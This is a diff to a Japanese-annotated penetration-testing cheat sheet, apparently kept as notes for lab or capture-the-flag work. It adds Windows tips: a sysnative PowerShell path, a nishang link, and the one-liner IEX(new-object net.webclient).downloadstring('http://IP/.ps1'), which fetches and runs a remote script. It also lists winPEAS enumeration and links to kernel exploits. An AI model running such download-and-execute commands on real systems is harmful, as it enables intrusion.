@@ -766,13 +766,24 @@ puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 
 
 ## windows
+- AdSyncDecrypt  
+[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)
+- cmd
+```bat
+# execute 64bit process on 32bit process
+C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
+```
+- powershell  
+  [nishang](https://github.com/samratashok/nishang)
+```powershell
+[Environment]::Is64BitProcess
+IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
+```
 - winpeas
 ```bat
 # 32bit or 64bit のバージョンに注意
 .\winPEASx64.exe userinfo quiet
 ```
-- AdSyncDecrypt  
-[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)
 ### exploit
 #### windows
 - [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-066)
@@ -806,7 +817,6 @@ puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 - a
 - https://github.com/kavika13/RemCom
 - https://www.hyhforever.top/
-- https://github.com/samratashok/nishang
 
 
 
